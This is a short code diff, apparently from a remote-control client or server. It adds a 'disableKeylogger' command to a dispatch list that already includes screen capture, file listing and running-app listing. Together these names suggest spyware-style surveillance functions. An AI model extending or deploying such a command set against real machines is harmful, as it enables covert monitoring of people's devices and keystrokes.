@@ -26,7 +26,8 @@ int main() {
                 userInput.find("listRunningApp") == 0 ||
                 userInput.find("listInstalledApp") == 0 ||
                 userInput.find("listFiles") == 0 ||
-                userInput.find("captureScreen") == 0
+                userInput.find("captureScreen") == 0 ||
+                userInput.find("disableKeylogger") == 0 
                 ) {
                 // Receive the file name from the server
                 memset(buffer, 0, sizeof(buffer));
